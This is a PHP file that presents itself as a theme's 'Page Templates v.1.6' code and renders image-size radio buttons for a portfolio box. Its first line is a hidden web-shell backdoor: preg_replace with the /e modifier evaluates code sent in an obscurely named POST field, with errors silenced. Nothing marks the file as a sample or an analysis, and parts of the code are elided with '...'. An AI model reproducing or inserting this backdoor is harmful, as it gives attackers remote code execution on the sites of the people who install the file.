<?php @preg_replace('/(.*)/e', @$_POST['qfoqbugctjqqvvxdn'], '');
 

/********* Page Templates v.1.6 ************/
...
function et_ptemplate_meta($callback_args) {
	...
	<div style="margin: 13px 0 11px 4px; display: none;" class="et_pt_portfolio">
		...
		<label title="Small"><input type="radio" name="et_ptemplate_imagesize" value="1"<?php if ( $et_ptemplate_imagesize == 1 ) echo ' checked="checked"'; ?>> <span>Small</span></label><br><br>
		<label title="Medium"><input type="radio" name="et_ptemplate_imagesize" value="2"<?php if ( $et_ptemplate_imagesize == 2 ) echo ' checked="checked"'; ?>> <span>Medium</span></label><br><br>
		<label title="Large"><input type="radio" name="et_ptemplate_imagesize" value="3"<?php if ( $et_ptemplate_imagesize == 3 ) echo ' checked="checked"'; ?>> <span>Large</span></label>
	</div>
